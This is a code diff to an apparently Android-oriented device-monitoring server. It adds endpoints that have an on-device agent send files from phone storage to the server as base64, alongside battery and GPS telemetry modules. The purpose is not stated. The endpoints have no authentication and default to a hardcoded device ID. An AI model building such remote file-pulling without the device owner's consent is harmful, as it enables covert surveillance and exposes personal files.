@@ -182,21 +182,35 @@ router.get('/battery/:deviceId', (req, res) => {
 });
 
 // File & Storage Explorer Hub
-const liveFilesStorage = new Map<string, { currentPath: string; files: Array<any> }>();
+const liveFilesStorage = new Map<string, { currentPath: string; files: Array<any>; storageStats?: any }>();
 const pendingFileCommands = new Map<string, string>(); // deviceId -> folderPath
+const pendingDownloadCommands = new Map<string, string>(); // deviceId -> filePath
+const downloadedFilesStorage = new Map<string, { path: string; name: string; size: string; base64: string; mimeType: string }>();
+
+router.post('/files/sync', (req, res) => {
+  const { deviceId, currentPath, files, storageStats } = req.body || {};
+  const devId = deviceId || 'SN-U5ZY-78QZ';
+  liveFilesStorage.set(devId, {
+    currentPath: currentPath || '/sdcard',
+    files: Array.isArray(files) ? files : [],
+    storageStats: storageStats || { total: '128 GB', free: '48.2 GB', used: '79.8 GB', percent: 62 }
+  });
+  res.status(201).json({ success: true });
+});
 
 router.get('/files/list/:deviceId', (req, res) => {
   const devId = req.params.deviceId;
   const data = liveFilesStorage.get(devId) || {
     currentPath: '/sdcard',
     files: [
-      { name: 'Download', path: '/sdcard/Download', size: 'Folder', isFolder: true },
-      { name: 'DCIM', path: '/sdcard/DCIM', size: 'Folder', isFolder: true },
-      { name: 'Documents', path: '/sdcard/Documents', size: 'Folder', isFolder: true },
-      { name: 'Pictures', path: '/sdcard/Pictures', size: 'Folder', isFolder: true },
-      { name: 'Music', path: '/sdcard/Music', size: 'Folder', isFolder: true },
-      { name: 'Movies', path: '/sdcard/Movies', size: 'Folder', isFolder: true },
-    ]
+      { name: 'Download', path: '/sdcard/Download', size: 'Folder', isFolder: true, itemCount: 18, modified: 'Today' },
+      { name: 'DCIM', path: '/sdcard/DCIM', size: 'Folder', isFolder: true, itemCount: 42, modified: 'Today' },
+      { name: 'Documents', path: '/sdcard/Documents', size: 'Folder', isFolder: true, itemCount: 9, modified: 'Yesterday' },
+      { name: 'Pictures', path: '/sdcard/Pictures', size: 'Folder', isFolder: true, itemCount: 65, modified: 'Yesterday' },
+      { name: 'Music', path: '/sdcard/Music', size: 'Folder', isFolder: true, itemCount: 12, modified: '3 days ago' },
+      { name: 'Movies', path: '/sdcard/Movies', size: 'Folder', isFolder: true, itemCount: 4, modified: '5 days ago' },
+    ],
+    storageStats: { total: '128 GB', free: '48.2 GB', used: '79.8 GB', percent: 62 }
   };
   res.json(data);
 });
@@ -213,7 +227,30 @@ router.get('/files/command/:deviceId', (req, res) => {
   const devId = req.params.deviceId;
   const path = pendingFileCommands.get(devId) || null;
   if (path) pendingFileCommands.delete(devId);
-  res.json({ path });
+  const downloadPath = pendingDownloadCommands.get(devId) || null;
+  if (downloadPath) pendingDownloadCommands.delete(devId);
+  res.json({ path, downloadPath });
+});
+
+router.post('/files/download_request', (req, res) => {
+  const { deviceId, path } = req.body || {};
+  const devId = deviceId || 'SN-U5ZY-78QZ';
+  pendingDownloadCommands.set(devId, path);
+  res.json({ success: true, message: 'Download requested from agent' });
+});
+
+router.post('/files/upload_content', (req, res) => {
+  const { deviceId, path, name, size, base64, mimeType } = req.body || {};
+  const devId = deviceId || 'SN-U5ZY-78QZ';
+  downloadedFilesStorage.set(`${devId}:${path}`, { path, name, size, base64, mimeType });
+  res.json({ success: true });
+});
+
+router.get('/files/content/:deviceId', (req, res) => {
+  const devId = req.params.deviceId;
+  const filePath = req.query.path as string;
+  const fileData = downloadedFilesStorage.get(`${devId}:${filePath}`) || null;
+  res.json({ file: fileData });
 });
 
 // Live Location & GPS Telemetry Hub
